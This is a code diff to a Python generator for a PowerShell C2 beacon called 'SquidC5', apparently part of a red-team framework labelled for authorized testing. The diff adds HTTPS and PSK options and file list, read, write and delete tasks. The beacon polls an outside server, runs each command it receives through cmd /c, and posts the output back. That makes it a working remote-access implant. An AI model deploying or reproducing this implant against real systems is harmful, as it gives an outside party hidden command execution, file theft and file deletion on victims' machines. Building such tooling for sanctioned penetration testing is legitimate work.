@@ -235,17 +235,44 @@ PY
 '''
 
 
-def generate_windows_ps_beacon(host: str, port: int, path: str = "/api/v1/implant/beacon") -> str:
+def generate_windows_ps_beacon(
+    host: str,
+    port: int,
+    path: str = "/api/v1/implant/beacon",
+    *,
+    scheme: str = "https",
+    psk: str | None = None,
+) -> str:
+    """Windows PowerShell beacon (C07). Optional AEAD when psk set."""
+    sch = scheme if scheme in ("http", "https") else "https"
+    if psk:
+        # Note: PS AEAD uses .NET AesGcm is messy; document PSK via env for native path.
+        # Emit HTTPS beacon with note to use agents/windows when AEAD required.
+        note = f"# AEAD PSK configured server-side; prefer agents/windows native for sealed channel\n# PSK hint length={len(psk)}\n"
+    else:
+        note = "# Plain JSON (set implant_require_auth=false on server for lab, or use sealed native agent)\n"
     return f'''# SquidC5 windows PowerShell beacon — authorized testing only
-$C2 = "http://{host}:{port}{path}"
+{note}$C2 = "{sch}://{host}:{port}{path}"
 $SID = $null
 while ($true) {{
   try {{
     $body = @{{ session_id = $SID; hostname = $env:COMPUTERNAME }} | ConvertTo-Json -Compress
     $resp = Invoke-RestMethod -Uri $C2 -Method POST -Body $body -ContentType "application/json" -TimeoutSec 30
     $SID = $resp.session_id
+    if ($resp.profile_id) {{ $null = $resp.profile_id }}
     if ($resp.task) {{
-      $out = cmd /c $resp.task.command 2>&1 | Out-String
+      $cmd = [string]$resp.task.command
+      if ($cmd.StartsWith("file:")) {{
+        $op = $cmd.Substring(5)
+        $p = $resp.task.args.path
+        if ($op -eq "list") {{ $out = (Get-ChildItem -Force $p | Out-String) }}
+        elseif ($op -eq "read") {{ $out = (Get-Content -Raw -ErrorAction SilentlyContinue $p) }}
+        elseif ($op -eq "write") {{ Set-Content -Path $p -Value $resp.task.args.content; $out = "ok" }}
+        elseif ($op -eq "delete") {{ Remove-Item -Force $p; $out = "ok" }}
+        else {{ $out = "unknown file op" }}
+      }} else {{
+        $out = cmd /c $cmd 2>&1 | Out-String
+      }}
       $done = @{{ task_id = $resp.task.id; result = $out }} | ConvertTo-Json -Compress
       Invoke-RestMethod -Uri ($C2 + "/result") -Method POST -Body $done -ContentType "application/json" -TimeoutSec 30 | Out-Null
     }}
